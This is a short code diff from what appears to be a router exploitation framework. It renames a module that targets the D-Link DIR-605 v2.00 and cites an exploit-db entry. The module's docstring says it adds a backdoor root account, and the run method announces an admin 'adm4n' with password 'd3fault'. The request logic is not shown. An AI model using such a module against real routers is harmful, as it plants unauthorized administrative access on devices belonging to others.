@@ -2,14 +2,14 @@ import urllib
 import util
 from ..router_vuln import RouterVuln
 
-__router__ = 'DIR-605 v2.00'
-__vuln__='Backdoor Root'
-class Backdoor(RouterVuln):
+class add_admin_605(RouterVuln):
 	""" Adds a backdoor root account to the router
 		http://www.exploit-db.com/exploits/18638/
 	"""
 	def __init__(self):
-		super(Backdoor,self).__init__()
+		self.router = 'DIR-605 v2.00'
+		self.vuln   = 'Backdoor Root'
+		super(add_admin_605,self).__init__()
 
 	def run(self):
 		util.Msg('Adding admin \'adm4n\' with password \'d3fault\'')
